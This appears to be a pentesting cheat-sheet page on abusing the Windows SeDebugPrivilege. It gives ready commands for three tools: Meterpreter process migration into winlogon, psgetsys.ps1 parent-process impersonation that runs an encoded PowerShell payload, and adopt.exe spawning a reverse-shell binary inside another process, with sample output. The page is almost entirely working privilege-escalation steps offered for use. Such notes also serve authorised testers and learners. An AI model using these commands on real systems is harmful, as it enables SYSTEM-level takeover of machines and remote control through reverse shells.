---
title: "SeDebugPrivilege"
tags: ["SeDebugPrivilege", "Windows", "Metasploit", "Reverse Shell"]
---

### Tools

{{< tab set1 tab1 >}}Metasploit{{< /tab >}}
{{< tab set1 tab2 >}}psgetsys.ps1{{< /tab >}}
{{< tab set1 tab3 >}}adopt.exe{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Inside meterpreter
ps winlogon
```

```console
# Explorer.exe is a good candidate
migrate <PID>
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# Import module
. .\psgetsys.ps1
```

```console
ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <POWERSHELL_3_BASE64>"
```

<small>*Ref: [psgetsys](https://github.com/decoder-it/psgetsystem)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
.\adopt.exe '<PROCESS>' '<CMD>'
```

```console {class="sample-code"}
PS C:\windows\tasks> .\adopt.exe filebeat.exe "C:\windows\tasks\rev.exe"
.\adopt.exe filebeat.exe "C:\windows\tasks\rev.exe"
[>] Target pid is 2776
[>] ShellExecuteExW is at 00007FFBE93E74A0
[>] Thread running, done! (Handle: 192)
```

<small>*Ref: [adopt.exe](https://github.com/xct/adopt)*</small>

{{< /tabcontent >}}